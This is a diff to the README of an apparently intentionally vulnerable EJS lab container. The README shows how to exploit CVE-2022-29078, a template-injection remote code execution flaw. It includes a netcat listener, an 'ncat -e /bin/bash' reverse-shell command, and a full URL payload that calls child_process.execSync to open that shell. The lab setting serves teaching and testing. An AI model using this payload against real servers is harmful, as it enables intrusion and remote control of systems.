@@ -14,6 +14,7 @@ run it locally
 Build the docker image
 
 `docker build . -t vuln-ejs:latest`
+
 Run it
 
 `docker run -p 3000:3000 vuln-ejs:latest`
@@ -25,9 +26,12 @@ Run it
 `nc -lv 1337`
 
 Then we will exploit CVE-2022-29078 RCE to create a remote shell by issuing the following command in the container
-`ncat host.docker.internal 1337 -e /bin/bash`
+
+```ncat host.docker.internal 1337 -e /bin/bash```
 
 Note : pay attention that the netcat command may differs between the host OS & the container's distro (in macosx is it `nc`, while in the container it is `ncat`)
+
+
 2 - To do that you will exploit the vulnerabilities using the following url 
 
 `http://localhost:3000/?id=David&settings[view%20options][outputFunctionName]=x;process.mainModule.require(%27child_process%27).execSync(%27ncat%20host.docker.internal%201337%20-e%20/bin/bash%27);s`
